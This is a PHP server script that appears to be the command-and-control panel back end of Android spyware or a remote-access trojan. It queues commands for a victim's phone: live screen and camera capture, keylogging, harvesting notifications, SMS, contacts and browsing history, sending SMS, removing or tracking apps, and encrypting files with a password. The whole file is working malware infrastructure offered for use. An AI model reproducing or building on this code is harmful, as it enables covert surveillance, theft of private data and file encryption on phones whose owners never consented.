<?php

//this called from panel to insert new commands to the mobile

require_once 'yarsap_14881.php';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'));

    if (!empty($data->email) && !empty($data->token)) {


        try {
            $user_email = $data->email ?? 'empty';
            $user_token = $data->token ?? 'empty';
            $phone_id = $data->phoneid ?? 'empty';
            $command = $data->command;

            list($isValid, $message) = SessionCheck($user_email, $user_token);

            if (!$isValid) {
                die("Authentication failed $message");
            }

            $conn = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


            $stmt = $conn->prepare("SELECT * FROM users WHERE email = :email AND token = :token AND token_expiration >= NOW()");


            $stmt->bindParam(':email', $user_email);
            $stmt->bindParam(':token', $user_token);

            $stmt->execute();

            $result = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($result) {

                $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $checkOnlineQuery = "SELECT isonline FROM phones WHERE phone_id = :pid";
                $stmt1 = $conn2->prepare($checkOnlineQuery);
                $stmt1->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                $stmt1->execute();


                $isonline = $stmt1->fetchColumn();

                if ($isonline === false) {

                    echo "Phone not found" . $phone_id;
                    exit;
                }


                $userId = $result['userid'];
                $SPL_DATA = '[>D<]';
                $SPL_SOCKET = '[>S<]';
                switch ($command) {
                    case "Screen":
                        $subcommand = $data->subcommand;



                        switch ($subcommand) {
                            case 'ON':

                                if ($isonline != 1) {
                                    echo "Phone is not online";
                                    exit;
                                }

                                $screentype = $data->scrt;
                                $screenquality = $data->scrq;

                                // Validate screentype: it should be one of "N", "SM", "SK", "IN"
                                $validScreenTypes = ['N', 'SM', 'SK', 'IN'];
                                if (!in_array($screentype, $validScreenTypes)) {
                                    echo "Unkown Screen Type";
                                    exit;
                                }

                                // it should be a number (or a string representing a number) between 1 and 100
                                if (!is_numeric($screenquality) || $screenquality < 1 || $screenquality > 100) {
                                    echo "Unkown Screen Quality";
                                    exit;
                                }

                                $newcommanddata = 'Screen' . $SPL_SOCKET . 'ON' . $SPL_SOCKET . $screenquality . $SPL_SOCKET . $screentype . $SPL_SOCKET;


                                echo Sendit($newcommanddata, $phone_id, $userId);


                                break;

                            case 'OFF':
                                if ($isonline != 1) {
                                    echo "Phone is not online";
                                    exit;
                                }
                                $newcommanddata = 'Screen' . $SPL_SOCKET . 'OFF' . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }
                        break;
                    case "Cam":
                        $subcommand = $data->subcommand;

                        switch ($subcommand) {
                            case 'on':

                                if ($isonline != 1) {
                                    echo "Phone is not online";
                                    exit;
                                }

                                $SelectedCam = $data->SelectedCam ?? 'empty';

                                if ($SelectedCam !== '1' && $SelectedCam !== '0') {
                                    echo "Unkown Camera ID !";
                                    exit;
                                }

                                $SelectedRes = $data->SelectedRes ?? 'empty';

                                $validResolutions = array('320x240', '640x360', '1280x720');

                                if (!in_array($SelectedRes, $validResolutions)) {
                                    echo "Unkown Resolution !";
                                    exit;
                                }

                                $SelectedQua = $data->SelectedQua ?? 'empty';

                                $validQualities = array('low', 'medium', 'high');

                                if (!in_array($SelectedQua, $validQualities)) {
                                    echo "Unkown Quality !";
                                    exit;
                                }

                                list($width, $height) = explode('x', $SelectedRes);

                                $newcommanddata = 'Camera' .
                                    $SPL_SOCKET .
                                    'ON' .
                                    $SPL_SOCKET .
                                    $userId .
                                    $SPL_SOCKET .
                                    $SelectedCam .
                                    $SPL_SOCKET .
                                    $width .
                                    $SPL_SOCKET .
                                    $height .
                                    $SPL_SOCKET .
                                    $SelectedQua;

                                echo Sendit($newcommanddata, $phone_id, $userId);


                                break;

                            case 'off':
                                if ($isonline != 1) {
                                    echo "Phone is not online";
                                    exit;
                                }
                                $newcommanddata = 'Camera' . $SPL_SOCKET . 'OFF' . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }
                        break;

                    case "activz":
                        $subcommand = $data->subcommand;

                        switch ($subcommand) {
                            case 'L':

                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }

                                $keydate = $data->kdate;
                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'GA' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;

                            case 'D':
                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }


                                $keydate = $data->kdate;
                                $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                                $stmt2 = $conn2->prepare("DELETE FROM phoneactivity WHERE activ_time = :ktime AND phone_id = :pid AND user_id = :uuid");
                                $stmt2->bindParam(':ktime', $keydate);
                                $stmt2->bindParam(':pid', $phone_id);
                                $stmt2->bindParam(':uuid', $userId);
                                $stmt2->execute();

                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'DA' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }
                        break;
                    case "notifys":
                        $subcommand = $data->subcommand;

                        switch ($subcommand) {
                            case 'L':

                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }

                                $keydate = $data->kdate;
                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'GF' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;

                            case 'D':
                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }


                                $keydate = $data->kdate;
                                $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                                $stmt2 = $conn2->prepare("DELETE FROM phone_notifys WHERE notifi_time = :ktime AND phone_id = :pid AND user_id = :uuid");
                                $stmt2->bindParam(':ktime', $keydate);
                                $stmt2->bindParam(':pid', $phone_id);
                                $stmt2->bindParam(':uuid', $userId);
                                $stmt2->execute();

                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'DF' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }
                        break;
                    case "vapps":
                        $subcommand = $data->subcommand;

                        switch ($subcommand) {
                            case 'L':

                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }

                                $keydate = $data->kdate;
                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'GV' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;

                            case 'D':
                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }


                                $keydate = $data->kdate;
                                $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                                $stmt2 = $conn2->prepare("DELETE FROM visitedapps WHERE vapp_time = :ktime AND phone_id = :pid AND user_id = :uuid");
                                $stmt2->bindParam(':ktime', $keydate);
                                $stmt2->bindParam(':pid', $phone_id);
                                $stmt2->bindParam(':uuid', $userId);
                                $stmt2->execute();

                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'DV' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }
                        break;
                    case "vlinks":
                        $subcommand = $data->subcommand;

                        switch ($subcommand) {
                            case 'L':

                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }

                                $keydate = $data->kdate;
                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'GU' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;

                            case 'D':
                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }


                                $keydate = $data->kdate;
                                $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                                $stmt2 = $conn2->prepare("DELETE FROM visitedlinks WHERE vlink_time = :ktime AND phone_id = :pid AND user_id = :uuid");
                                $stmt2->bindParam(':ktime', $keydate);
                                $stmt2->bindParam(':pid', $phone_id);
                                $stmt2->bindParam(':uuid', $userId);
                                $stmt2->execute();

                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'DU' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }
                        break;

                    case "Keylog":

                        $subcommand = $data->subcommand;

                        switch ($subcommand) {

                            case 'V': //v = live
                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }

                                $state = $data->state;

                                $alowdstate = array('1', '0');

                                if (!in_array($state, $alowdstate)) {
                                    echo "Invalid request.";
                                    exit();
                                }

                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'LK' . $SPL_SOCKET . $state . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;

                            case 'L':

                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }

                                $keydate = $data->kdate;
                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'GK' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;

                            case 'D':
                                if ($isonline != 1) {


                                    echo "Phone is not online";
                                    exit;
                                }


                                $keydate = $data->kdate;
                                $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

                                $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                                $stmt2 = $conn2->prepare("DELETE FROM keylogs WHERE klog_time = :ktime AND phone_id = :pid AND user_id = :uuid");
                                $stmt2->bindParam(':ktime', $keydate);
                                $stmt2->bindParam(':pid', $phone_id);
                                $stmt2->bindParam(':uuid', $userId);
                                $stmt2->execute();

                                $newcommanddata = 'Activitys' . $SPL_SOCKET . 'DK' . $SPL_SOCKET . $keydate . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            default:
                                # code...
                                break;
                        }

                        break;

                    case "Permissions":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }

                        $subcommand = $data->subcommand;

                        switch ($subcommand) {
                            case 'Clear':

                                $commandquery = "UPDATE phones SET mob_permissions = null where phone_id = :pid";
                                $stmt2 = $conn2->prepare($commandquery);
                                $stmt2->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                                $stmt2->execute();

                                $affectedRows = $stmt2->rowCount();

                                if ($affectedRows > 0) {
                                    echo "OK";
                                } else {
                                    echo "NO";
                                }


                                break;

                            case 'R':
                                $prim = $data->prim;
                                $newcommanddata = 'Permissions' . $SPL_SOCKET . 'R' . $SPL_SOCKET . $prim . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;

                            default:
                                # code...
                                break;
                        }
                        break;
                    case "APPS":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }

                        $subcommand = $data->subcommand;
                        switch ($subcommand) {
                            case "L":
                                //L = Load
                                $newcommanddata = 'Apps' . $SPL_SOCKET . "L";

                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;

                            case "com":
                                //D = Disable
                                //E = Enable
                                //S = Start
                                //T = Track
                                //UT = UNtrack
                                //R = Remove
                                $commandsapps = array('D', 'E', 'S', 'T', 'UT', 'R');

                                $Appscommand = $data->Appcommand;
                                if (!in_array($Appscommand, $commandsapps)) {

                                    echo "Unkown App Command.";
                                    return;
                                }

                                $AppID = $data->appPKG;

                                $newcommanddata = 'Apps' . $SPL_SOCKET . $Appscommand . $SPL_SOCKET . $AppID;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                        }
                        break;
                    case "CONT":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }

                        $subcommand = $data->subcommand;
                        switch ($subcommand) {
                            case "A":
                                $cont_name = $data->cname;
                                $cont_number = $data->cnumb;
                                //Contacts

                                $newcommanddata = 'Contacts' . $SPL_SOCKET . "A" . $SPL_SOCKET . $cont_name . $SPL_SOCKET . $cont_number . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;
                            case "L":
                                $targetbox = $data->box;
                                $newcommanddata = 'Contacts' . $SPL_SOCKET . "L" . $SPL_SOCKET . $targetbox . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;
                        }
                        break;
                    case "SMS":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }

                        $subcommand = $data->subcommand;
                        switch ($subcommand) {
                            case "S":
                                $Snumber = $data->snum;
                                $SMSG = $data->smsg;
                                if (strlen($SMSG) > 150) {
                                    echo 'Message to Long , Max 150.';
                                    exit;
                                }
                                $newcommanddata = 'SMS' . $SPL_SOCKET . "S" . $SPL_SOCKET . $Snumber . $SPL_SOCKET . $SMSG . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "L":
                                $targetbox = $data->box;
                                $newcommanddata = 'SMS' . $SPL_SOCKET . "L" . $SPL_SOCKET . $targetbox . $SPL_SOCKET;

                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;
                        }
                        break;
                    case "files":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }

                        $subcommand = $data->subcommand;

                        switch ($subcommand) {

                            case "E":
                                $oldname = $data->old_name;
                                $newname = $data->new_name;

                                $newcommanddata = 'Files' . $SPL_SOCKET . 'N' . $SPL_SOCKET . $oldname . $SPL_SOCKET . $newname;
                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;
                            case "R":
                                $fpath = $data->fpath;
                                $ftype = $data->ftype;

                                $newcommanddata = 'Files' . $SPL_SOCKET . 'R' . $SPL_SOCKET . $ftype . $SPL_SOCKET . $fpath;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "DE":
                                $dpass = $data->decpass;
                                $dpaths = $data->decpaths;
                                $alpath = $data->inpath;

                                $newcommanddata = 'Files' . $SPL_SOCKET . 'DE' . $SPL_SOCKET . $dpass . $SPL_SOCKET . $dpaths . $SPL_SOCKET . $alpath;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "EN":
                                $epass = $data->encpass;
                                $epaths = $data->encpaths;

                                $newcommanddata = 'Files' . $SPL_SOCKET . 'EN' . $SPL_SOCKET . $epass . $SPL_SOCKET . $epaths . $SPL_SOCKET . ".Ecrypted";
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "Z":
                                $zipname = $data->zname;
                                $zippaths = $data->zpaths;

                                $newcommanddata = 'Files' . $SPL_SOCKET . 'Z' . $SPL_SOCKET . $zipname . $SPL_SOCKET . $zippaths;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "UZ":
                                $zippth = $data->zpath;
                                $extpath = $data->extpath;
                                $newcommanddata = 'Files' . $SPL_SOCKET . 'UZ' . $SPL_SOCKET . $zippth . $SPL_SOCKET . $extpath;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "O":
                                $newcommanddata = 'Files' . $SPL_SOCKET . 'O' . $SPL_SOCKET . $data->newpth;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "D":
                                $newcommanddata = 'Files' . $SPL_SOCKET . 'D' . $SPL_SOCKET . $data->newpth;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "L":
                                $newcommanddata = 'Files' . $SPL_SOCKET . 'L' . $SPL_SOCKET . $data->newpth;
                                echo Sendit($newcommanddata, $phone_id, $userId);
                                break;
                            case "V":

                                $state = $data->fstate;

                                $newcommanddata = 'Files' . $SPL_SOCKET . 'V' . $SPL_SOCKET . $data->newpth . $SPL_SOCKET . $state;

                                echo Sendit($newcommanddata, $phone_id, $userId);

                                break;
                        }

                        break;

                    case "rename":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }
                        $newcommanddata = 'Rename' . $SPL_SOCKET . $data->nam . $SPL_SOCKET;

                        echo Sendit($newcommanddata, $phone_id, $userId);
                        break;
                    case "Notify":
                        if ($isonline != 1) {


                            echo "Phone is not online";
                            exit;
                        }
                        //Notifi[>S<]Hello[>S<]
                        $newcommanddata = 'Notifi' . $SPL_SOCKET . $data->noti . $SPL_SOCKET;

                        echo Sendit($newcommanddata, $phone_id, $userId);
                        break;

                    case "delete":
                        //echo $phone_id;
                        //DELETE from phones where phone_id=145322869
                        {


                            $commandquery = "UPDATE phones SET isRemoved = '1' where phone_id = :pid";
                            $stmt2 = $conn2->prepare($commandquery);
                            $stmt2->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                            $stmt2->execute();


                            $newcommanddata = 'Delete' . $SPL_SOCKET . "[reme]" . $SPL_SOCKET;

                            echo Sendit($newcommanddata, $phone_id, $userId);
                        }

                        break;

                    default:
                        echo "Unkown command!";
                }
            } else {
                // Token is invalid or expired
                echo "Invalid or expired token.";
            }
        } catch (PDOException $e) {
            logError($e);
            echo Format('784 Something went wrong please try again later.', OP_Fail);
        }
        $conn = null;
    } else {
        echo "Missing email or token data.";
    }
} else {
    echo "Invalid request.";
}


function Sendit($newcommanddata, $phone_id, $userId): string
{
    // $phone_id

    $conn2 = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);

    $conn2->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $commandquery = "INSERT INTO `commands` (`phone_id`, `user_id`, `content`) VALUES (:pid, :uuid, :com)";

    $stmt2 = $conn2->prepare($commandquery);
    $stmt2->bindParam(':pid', $phone_id, PDO::PARAM_STR);
    $stmt2->bindParam(':uuid', $userId, PDO::PARAM_INT);
    $stmt2->bindParam(':com', $newcommanddata, PDO::PARAM_STR);
    $stmt2->execute();



    $affectedRows = $stmt2->rowCount();

    if ($affectedRows > 0) {
        return "OK";
    } else {
        return "NO";
    }
}
